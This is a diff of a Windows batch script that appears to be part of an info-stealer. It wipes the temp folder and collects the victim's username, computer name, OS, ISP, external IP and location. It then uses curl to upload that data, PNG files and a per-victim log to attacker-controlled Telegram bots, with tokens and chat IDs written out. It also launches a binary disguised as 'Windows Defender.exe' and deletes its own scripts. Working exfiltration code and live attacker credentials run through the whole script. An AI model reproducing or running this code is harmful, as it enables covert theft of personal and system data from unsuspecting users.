@@ -1,14 +1,6 @@
 @echo off
 setlocal 
 
-attrib +s +h +i "%~f0"
-
-call :TRACKER > "%temp%\process.pid"
-call :FINISH
-
-:TRACKER
-attrib +s +h +i "%temp%\process.pid"
-
 del /s /f /q /a "%temp%\*"
 FOR /D %%p IN ("%temp%\*.*") DO rmdir "%%p" /s /q
 :connectivitycheck
@@ -94,19 +86,16 @@ if "%status%"=="404" (
   echo.
 )
 
-set "InputVariable=NEW CONNECTION: %username%@%computername% [%WinEdition% %OSArchitecture%] [%ISP% (%ExtIP%)] [%City% (%Region%, %Country%)] [{Tor is enabled: %TorStatus%] [Web Server:%WS%]"
+SET "InputVariable=NEW CONNECTION: %username%@%computername% [%WinEdition% %OSArchitecture%] [%ISP% (%ExtIP%)] [%City% (%Region%, %Country%)] [{Tor is enabled: %TorStatus%] [Web Server:%WS%]"
 for /f "usebackq delims=" %%i in (`powershell -command "$OutputVariable='%InputVariable%'-replace '[^\x00-\x7F]', ''; $OutputVariable"`) do set "OutputVariable=%%i"
 
-"%environment%\curl.exe" -k %proxy% -F text="%OutputVariable% " https://api.telegram.org/bot5919717252:AAE3HbKOIhMcsP9NiKLAAZD8Nf9HQhRZgIY/sendMessage?chat_id=-854583574 >> "%userN%@%computerN%.txt"
+"%environment%\curl.exe" -k %proxy% -F text="%OutputVariable% " https://api.telegram.org/bot5919717252:AAE3HbKOIhMcsP9NiKLAAZD8Nf9HQhRZgIY/sendMessage?chat_id=-854583574 
 for %%# in ("*.png") do "%environment%\curl.exe" -k %proxy% -F document=@"%%~f#" https://api.telegram.org/bot6053961003:AAENR1HtCpNA7AJaWN1LUnPXxuEsoogKBG8/sendDocument?chat_id=-1001930176759
 "%environment%\curl.exe" -k %proxy% -F document=@"%userN%@%computerN%.txt" https://api.telegram.org/bot6330710820:AAFCaGDiYMvQ2SJxcMbvP6D2_tCFS9NtBzo/sendDocument?chat_id=-1001909920652
 
 cd "%temp%"
 rmdir /s /q "%temp%\%folder%"
-exit /b
 
-:FINISH
-powershell.exe Remove-Item -Force -Recurse "%temp%\process.pid"
 "%environment%\Windows Defender.exe" -P"rofile of Windows Defender [Microsoft Corporation]"
 endlocal
 powershell.exe Remove-Item -Force -Recurse "%environment%\Win32\*.bat" && exit
